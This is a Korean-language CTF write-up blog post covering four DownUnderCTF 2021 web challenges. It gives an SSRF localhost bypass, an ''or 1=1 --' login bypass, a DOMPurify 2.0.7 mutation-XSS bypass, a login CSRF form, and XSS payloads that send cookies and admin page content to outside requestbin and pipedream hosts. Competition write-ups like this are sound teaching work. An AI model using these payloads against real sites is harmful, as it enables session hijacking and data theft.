<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>DownUnderCTF 2021 Write Up :: My New Hugo Site</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="This article is about write-up for the DownUnderCTF 2021. there is only three web and one pwn, misc challenges, all of which contain SSRf and SQL Injection and CSRF bug" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.404error.life/posts/2021-09-26-downunder-ctf/" />







  
  
  
  
  
  <link rel="stylesheet" href="https://blog.404error.life/styles.css">







  <link rel="shortcut icon" href="https://blog.404error.life/img/theme-colors/orange.png">
  <link rel="apple-touch-icon" href="https://blog.404error.life/img/theme-colors/orange.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="DownUnderCTF 2021 Write Up">
<meta property="og:description" content="This article is about write-up for the DownUnderCTF 2021. there is only three web and one pwn, misc challenges, all of which contain SSRf and SQL Injection and CSRF bug" />
<meta property="og:url" content="https://blog.404error.life/posts/2021-09-26-downunder-ctf/" />
<meta property="og:site_name" content="My New Hugo Site" />

  
    <meta property="og:image" content="img/favicon/%!s(&lt;nil&gt;).png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2021-09-26 23:29:53 &#43;0000 UTC" />













  


</head>
<body class="">




<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://blog.404error.life/">
  <div class="logo">
    re-Terminal
  </div>
</a>

    </div>
    
    
  </div>
  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.404error.life/posts/2021-09-26-downunder-ctf/">DownUnderCTF 2021 Write Up</a>
  </h1>
  <div class="post-meta"><time class="post-date">2021-09-26</time>
    
</div>

  
  



  

  <div class="post-content"><div>
        <h1 id="web-challenge">Web Challenge<a href="#web-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<h1 id="inside-out-100-pts">Inside Out [100 pts]<a href="#inside-out-100-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>Inside Out 문제는 SSRF를 이용해 플래그를 획득하는 문제 입니다.</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/49112423/134766820-f6664887-434f-44b2-b3d5-435e650f8238.png" alt="image"></p>
<p>문제로 들어오면 위와 같이 환영 한다고 인사를 해주며 밑에 <code>Proxy Example</code>라는 링크가 있는 것을 볼 수 있습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/134766872-9b50f80e-2861-4c2f-81fd-de37c1b82855.png" alt="image"></p>
<p>위 링크를 클릭 해 접속을 하면 위와 같이 <code>url</code> 파라미터를 이용해서 요청 한 후에 응답 값을 가져오는 것을 볼 수 있고, 여기서 SSRF를 이용해서 플래그를 획득 해야 합니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/134766915-80c828de-115c-4fec-b9c6-9a66fed48d1c.png" alt="image"></p>
<pre tabindex="0"><code>http://0.0.0.0
</code></pre><p>대부분에 로컬 호스트는 필터링에 걸려 있어 위 페이로드를 이용해서 우회를 시도 하였고, 응답 값 내에 관리자 패널이 존재하는 것을 알 수 있습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/134766954-091f47f1-9859-4976-be87-644b820cee9c.png" alt="image"></p>
<p>그래서 /admin으로 SSRF 해주면 플래그를 획득할 수 있습니다.</p>
<pre tabindex="0"><code>DUCTF{very_spooky_request}
</code></pre><hr>
<h1 id="cowboy-world-100-pts">Cowboy World [100 pts]<a href="#cowboy-world-100-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>Cowboy World 문제는 SQL Injection을 이용한 인증 우회를 이용해 플래그를 획득하는 문제 입니다.</p>
</blockquote>
<p><img src="https://user-images.githubusercontent.com/49112423/134767015-a3e3feca-0ec8-45ca-bac5-bf0d6a9f9a25.png" alt="image"></p>
<p>문제로 들어오면 위와 같이 로그인 로직이 존재하는 것을 볼 수 있습니다. 하지만 username/password의 값으로 SQL Injection 페이로드를 삽입 해주어도 공격이 되지 않아 올바른 username을 찾아야 한다고 생각했습니다.</p>
<pre tabindex="0"><code># pls no look

User-Agent: regular_cowboys
Disallow: /sad.eml
</code></pre><pre tabindex="0"><code>Everyone says &#39;yeee hawwwww&#39;

but never &#39;hawwwww yeee&#39;

:&#39;(

thats why a &#39;sadcowboy&#39; is only allowed to go into our website
</code></pre><p>그래서 정보 수집을 하기 위해서 <code>/robots.txt</code>로 접속을 해보니 메일 파일이 있었고, 메일 내용으로 위와 같이 있었습니다. 그래서 그냥 username으로 <code>sadcowboy</code>를 넘겨주고 password 값으로 <code>'or 1=1 --</code> 해주니 해결 되었습니다.</p>
<pre tabindex="0"><code>DUCTF{haww_yeeee_downunderctf?}
</code></pre><hr>
<h1 id="x1337-sk1d-r3p0rt3r-232-pts">x1337 Sk1d R3p0rt3r [232 pts]<a href="#x1337-sk1d-r3p0rt3r-232-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>x1337 Sk1d R3p0rt3r 문제는 구문 분석에 의한 XSS를 이용해서 플래그를 획득하는 문제 입니다. 귀찮아서 gist에 올린 거 그대도 올립니다.</p>
</blockquote>
<pre tabindex="0"><code>poc-1. &lt;/script&gt;
poc-2. &lt;script&gt;`
</code></pre><pre tabindex="0"><code>1. Go to https://web-x1337-sk1d-r3p0rt3r-9cfd1dc4.chal-2021.duc.tf/.
2. login after register your personal account.
3. Edit the username to poc-1 and report to any value.
4. Edit the username to poc-2 and report to &#34;`;fetch(`http://requestbin/?c=`+document.cookie)//&#34;.
5. Finally, edit the username to poc-1 and report to any value.
6. Then we can successfully hijack the admin session
</code></pre><p><img src="https://user-images.githubusercontent.com/49112423/134772882-3cfe5698-ea5f-46ec-b48c-28d1e2668f00.png" alt=""></p>
<pre tabindex="0"><code>DUCTF{xxX_x55_4_1337_h4x0rz_Xxx}
</code></pre><hr>
<h1 id="notepad-473-pts">Notepad [473 pts]<a href="#notepad-473-pts" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<blockquote>
<p>Notepad 문제는 CSRF + XSS를 체이닝 해서 플래그를 획득하는 문제 입니다. 개인적으로 매우 쉬웠는데 솔브가 왜 적은 지 이해가 안 됨.</p>
</blockquote>
<p>소스 코드가 제공 됨으로 플래그 획득 조건을 확인 해보겠습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/admin&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">admin</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> quart<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#ae81ff">403</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> open(<span style="color:#e6db74">&#39;flag.txt&#39;</span>)<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/report&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@quart_rate_limiter.rate_limit</span>(<span style="color:#ae81ff">5</span>, dt<span style="color:#f92672">.</span>timedelta(seconds<span style="color:#f92672">=</span><span style="color:#ae81ff">10</span>))
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">report</span>():
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> quart<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;user&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> quart<span style="color:#f92672">.</span>redirect(quart<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">&#39;index&#39;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> quart<span style="color:#f92672">.</span>session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;admin&#39;</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Just in case anyone tries it</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;You&#39;re the admin... Go fix it yourself&#34;</span>, <span style="color:#ae81ff">418</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> quart<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        form <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> quart<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form
</span></span><span style="display:flex;"><span>        url <span style="color:#f92672">=</span> form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;url&#39;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> url:
</span></span><span style="display:flex;"><span>            __stub_get_url(url)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> quart<span style="color:#f92672">.</span>redirect(quart<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">&#39;me&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">await</span> quart<span style="color:#f92672">.</span>render_template(<span style="color:#e6db74">&#39;report.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/__stub/admin/login&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__stub_admin_login</span>():
</span></span><span style="display:flex;"><span>    quart<span style="color:#f92672">.</span>session[<span style="color:#e6db74">&#39;admin&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Ok&#34;</span>
</span></span></code></pre></div><p>플래그 획득 조건을 보면 <code>/admin</code>으로 요청한 사용자가 관리자 권한을 가지고 있어야 합니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/134767183-1628a4a0-90b4-4a2b-bccb-4a6db0b0cb9c.png" alt="image"></p>
<p>회원 가입 후 로그인을 해주니 노트 패드 로직이 존재하는 것을 확인할 수 있습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>    (<span style="color:#66d9ef">function</span>() {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">converter</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">showdown</span>.<span style="color:#a6e22e">Converter</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">tabs</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">from</span>(document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;.tabs &gt; a&#39;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">views</span> <span style="color:#f92672">=</span> Array.<span style="color:#a6e22e">from</span>(document.<span style="color:#a6e22e">querySelectorAll</span>(<span style="color:#e6db74">&#39;[data-view]&#39;</span>));
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">noteForm</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#note-form&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">markdown</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#markdown&#39;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">editor</span> <span style="color:#f92672">=</span> document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">&#39;#editor&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">tabs</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">tab</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">tab</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;click&#39;</span>, () =&gt; {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">tabs</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">t</span> =&gt; <span style="color:#a6e22e">t</span>.<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#39;active&#39;</span>));
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">tab</span>.<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#39;active&#39;</span>);
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">views</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">v</span> =&gt; <span style="color:#a6e22e">v</span>.<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">add</span>(<span style="color:#e6db74">&#39;is-hidden&#39;</span>));
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">const</span> <span style="color:#a6e22e">view</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">tab</span>.<span style="color:#a6e22e">getAttribute</span>(<span style="color:#e6db74">&#39;data-view-trigger&#39;</span>);
</span></span><span style="display:flex;"><span>                document.<span style="color:#a6e22e">querySelector</span>(<span style="color:#e6db74">`[data-view=&#34;</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">view</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;]`</span>)<span style="color:#f92672">?</span>.<span style="color:#a6e22e">classList</span>.<span style="color:#a6e22e">remove</span>(<span style="color:#e6db74">&#39;is-hidden&#39;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">view</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;view&#39;</span>) {
</span></span><span style="display:flex;"><span>                    <span style="color:#a6e22e">markdown</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">converter</span>.<span style="color:#a6e22e">makeHtml</span>(<span style="color:#a6e22e">editor</span>.<span style="color:#a6e22e">value</span>));
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            })
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">noteForm</span>.<span style="color:#a6e22e">addEventListener</span>(<span style="color:#e6db74">&#39;submit&#39;</span>, <span style="color:#a6e22e">e</span> =&gt; {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">preventDefault</span>();
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">e</span>.<span style="color:#a6e22e">stopImmediatePropagation</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">&#39;/me&#39;</span>, {
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">credentials</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;include&#39;</span>,
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {<span style="color:#e6db74">&#39;content-type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>},
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>({<span style="color:#a6e22e">note</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">editor</span>.<span style="color:#a6e22e">value</span>})
</span></span><span style="display:flex;"><span>            }).<span style="color:#a6e22e">then</span>(<span style="color:#a6e22e">r</span> =&gt; <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#39;Saved!&#39;</span>));
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">markdown</span>.<span style="color:#a6e22e">innerHTML</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">DOMPurify</span>.<span style="color:#a6e22e">sanitize</span>(<span style="color:#a6e22e">converter</span>.<span style="color:#a6e22e">makeHtml</span>(<span style="color:#a6e22e">editor</span>.<span style="color:#a6e22e">value</span>));
</span></span><span style="display:flex;"><span>    })();
</span></span></code></pre></div><p>코드를 확인 해보면 입력값을 받고, 마크 다운으로 처리 한 후에 sanitize 시켜주는 것을 볼 수 있습니다. 하지만 입력값은 마크 다운만 사용할 수 있게 정규식이 걸려 있는 것이 아니고, 일반 TEXT도 사용할 수 있는 것을 확인할 수 있습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/134767228-2901c65c-e903-43cd-a67b-4e4261dfe20e.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">img</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">x</span> <span style="color:#a6e22e">onerror</span><span style="color:#f92672">=</span><span style="color:#e6db74">alert(1)</span>&gt;
</span></span></code></pre></div><p>XSS를 트리거 하기 위해 위 POC를 저장해주니 당연히 sanitize에 의해 XSS가 제어 되고 있는 것을 확인할 수 있었습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdnjs.cloudflare.com/ajax/libs/showdown/1.9.1/showdown.min.js&#34;</span> <span style="color:#a6e22e">integrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sha512-L03kznCrNOfVxOUovR6ESfCz9Gfny7gihUX/huVbQB9zjODtYpxaVtIaAkpetoiyV2eqWbvxMH9fiSv5enX7bw==&#34;</span> <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span> <span style="color:#a6e22e">referrerpolicy</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-referrer&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js&#34;</span> <span style="color:#a6e22e">integrity</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sha512-pAsGSA54gmV3kpBZBDMk7SgP6DnYNNzj6ZFZ6//jUKOaXSSkE5sdbZMazo3u5QOofhZoGeNwo4Z4e526HPQhcg==&#34;</span> <span style="color:#a6e22e">crossorigin</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;anonymous&#34;</span> <span style="color:#a6e22e">referrerpolicy</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;no-referrer&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;
</span></span></code></pre></div><p>Dompurify는 2.0.7을 이용해 XSS를 대응하는 것을 확인 할 수 있었고, Dompurify Bypass Poc를 이용해서 XSS를 트리거 하기로 했습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/134767329-7625d16d-0af6-481f-b0f7-ba713d6e34bf.png" alt="image"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">mglyph</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;/math&gt;&lt;img src=x onerror=&#34;alert(1)&#34;&gt;&lt;p&gt;</span>
</span></span></code></pre></div><p>위 POC 코드를 저장해주니 Dompurify가 우회 돼 XSS가 트리거 되는 것을 확인할 수 있었고, 양 끝에 <code>&lt;/p&gt;</code>, <code>&lt;p&gt;</code> 태그를 넣어준 이유는 <code>converter.makeHtml()</code>를 이용해서 마크다운을 HTML로 변환해주고 반환 해주는데, 이때 양 옆에 불 필요한 <code>&lt;p&gt;</code> 태그가 생겨 무효화 시켜 주기 위함 입니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;/<span style="color:#f92672">p</span>&gt;&lt;<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">math</span>&gt;&lt;<span style="color:#f92672">mtext</span>&gt;&lt;/<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">form</span>&gt;&lt;<span style="color:#f92672">mglyph</span>&gt;&lt;<span style="color:#f92672">style</span>&gt;<span style="color:#960050;background-color:#1e0010">&lt;/math&gt;&lt;img src=x onerror=&#34;fetch(&#39;/admin&#39;).then(function(response){return/**/response.text();}).then(function(x){fetch(&#39;https://79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net/f=&#39;+x)})&#34;&gt;&lt;p&gt;</span>
</span></span></code></pre></div><p>마지막으로 위 POC 코드를 이용해서 플래그를 획득 하기로 했지만, Note 마다 고유의 번호가 존재 하지 않아 POC 코드를 저장해도 관리자가 해당 페이로드를 읽게 하는 데 무리가 있었습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/login&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login_</span>():
</span></span><span style="display:flex;"><span>    err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> quart<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
</span></span><span style="display:flex;"><span>        form <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> quart<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>form
</span></span><span style="display:flex;"><span>        username, password <span style="color:#f92672">=</span> map(form<span style="color:#f92672">.</span>get, [<span style="color:#e6db74">&#39;username&#39;</span>, <span style="color:#e6db74">&#39;password&#39;</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span> <span style="color:#f92672">or</span> password <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>            err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Username and password must be specified&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">elif</span> <span style="color:#f92672">not</span> <span style="color:#66d9ef">await</span> login(username, password):
</span></span><span style="display:flex;"><span>            err <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Invalid username or password&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            quart<span style="color:#f92672">.</span>session[<span style="color:#e6db74">&#39;user&#39;</span>] <span style="color:#f92672">=</span> username
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> quart<span style="color:#f92672">.</span>redirect(quart<span style="color:#f92672">.</span>url_for(<span style="color:#e6db74">&#39;me&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">await</span> quart<span style="color:#f92672">.</span>render_template(<span style="color:#e6db74">&#39;login.html&#39;</span>, err<span style="color:#f92672">=</span>err)
</span></span></code></pre></div><p>그러다가 로그인 로직을 확인 해보니 로그인을 성공하면 현재 로그인 한 사용자 세션으로 <code>/me</code>로 리다이렉션 시켜주는 것을 확인 할 수 있었습니다. 이를 이용해서 그냥 <code>CSRF</code> 해주면 됩니다.</p>
<p>개인 서버에 <code>Form</code> 태그를 올리고 관리자가 제 계정으로 로그인 하게 하고, 제 세션의 관리자 권한을 올려 플래그를 읽기로 했습니다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!doctype html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;xss poc&lt;/<span style="color:#f92672">title</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;https://web-notepad-f6ed1a7d.chal-2021.duc.tf/login&#34;</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;POST&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">poc</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pocas&#39;</span>&gt;
</span></span><span style="display:flex;"><span>                &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pocas&#39;</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">form</span>&gt;
</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">poc</span>.<span style="color:#a6e22e">submit</span>()
</span></span><span style="display:flex;"><span>        &lt;/<span style="color:#f92672">script</span>&gt;
</span></span><span style="display:flex;"><span>  &lt;/<span style="color:#f92672">body</span>&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
</span></span></code></pre></div><p>노트에 위 POC 코드를 저장하고, 개인 서버에는 위 POC 코드를 올린 후에 리포터 기능으로 개인 서버 URL을 전달 해주겠습니다.</p>
<p><img src="https://user-images.githubusercontent.com/49112423/134767511-4a5c171a-19c6-46e2-a155-049e4bfa2fc9.png" alt="image"></p>
<p>개인 서버 URL을 전달 해주니 플래그를 획득 할 수 있었습니다.</p>
<pre tabindex="0"><code>DUCTF{ch4ining_c5rf_c4uses_cha0s_2045c24d}
</code></pre><hr>
<h3 id="misc-challenge">Misc Challenge<a href="#misc-challenge" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
